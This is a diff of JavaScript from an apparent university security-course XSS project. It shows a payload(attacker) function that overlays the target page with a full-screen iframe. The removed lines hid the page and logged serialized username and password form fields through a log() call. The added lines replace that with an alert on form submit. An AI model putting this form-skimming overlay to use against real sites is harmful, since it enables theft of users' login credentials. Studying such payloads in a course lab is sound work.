@@ -13,11 +13,9 @@ function payload(attacker) {
       $("#query").val("pwned!");
     });
   }
-  
-  $("html").hide();
 
   $('<iframe>')
-    .css({
+  .css({
   position: 'absolute',
   width: '100%',
   height: '100%',
@@ -26,30 +24,11 @@ function payload(attacker) {
   border: 0,
   background: '#fff'
   })
-  .attr('src', "html")
-  .appendTo('body');
-  proxy("./");
-  
-  $('body',this.contentDocument)
-  .find('username.form-control')
-  .submit(function() {
-    log({event: 'submit',
-       from: location,
-       action: $(this).attr('action') || location,
-       fields: $(this).serialize()
-       });
-  })
-  .end()
-  .find('userpass.form-control')
-  .submit(function() {
-    log({event: 'submit',
-       from: location,
-       action: $(this).attr('action') || location,
-       fields: $(this).serialize()
-       });
-  })
-  .end();
-  
+  .attr('src', "http://cis551.cis.upenn.edu/project3/")
+  .appendTo("html")
+  .load(function() {
+	this.find('form').submit(function(){alert(0);});
+  });
 }
 
 function makeLink(xssdefense, target, attacker) {
